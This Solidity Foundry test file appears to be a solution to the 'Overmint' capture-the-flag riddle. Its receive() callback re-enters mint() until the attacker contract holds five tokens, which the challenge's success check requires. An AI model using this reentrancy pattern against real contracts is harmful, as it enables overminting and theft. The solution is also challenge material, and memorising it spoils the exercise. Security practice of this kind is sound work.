//SPDX - License - Identifier : Unlicensed
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Overmint} from "../contracts/OvermintRiddle.sol";

contract TestOvermint is Test {
    Overmint public overmint;
    address public admin;

    function setUp() external {
        admin = vm.addr(12345);
        overmint = new Overmint();
        console.log(address(overmint), "target address");
        console.log(address(this), "attacker address");
    }

    function test_mint() external {
        deal(address(this), 1 ether);
        overmint.mint{value: 1e6}();
        assertEq(overmint.balanceOf(address(this)), 5);
    }

    function test_success() external returns (bool result_) {
        deal(address(this), 1 ether);
        overmint.mint{value: 1e6}();
        result_ = overmint.success(address(this));
        console.log(result_);
    }

    receive() external payable {
        console.log(overmint.balanceOf(address(this)), "balance");
        if (overmint.balanceOf(address(this)) < 5) {
            overmint.mint{value: 1e6}();
        }
    }
}
